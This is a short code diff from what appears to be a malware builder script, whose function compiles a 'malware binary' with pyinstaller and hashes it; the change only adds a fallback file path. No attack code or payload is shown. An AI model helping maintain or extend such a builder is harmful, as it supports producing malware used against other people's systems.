@@ -81,7 +81,10 @@ def pybinary(option):
     subprocess.Popen(['pyinstaller', option], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     time.sleep(10)
     print('Successfully compiled malware binary to dist\server.exe')
-    file = ".\dist\server.exe" 
+    if os.path.isfile('.\dist\server.exe'):
+        file = ".\dist\server.exe"
+    else:
+        file = ".\dist\server"
     BLOCK_SIZE = 65536
     file_hash = hashlib.sha256()
     with open(file, 'rb') as f:
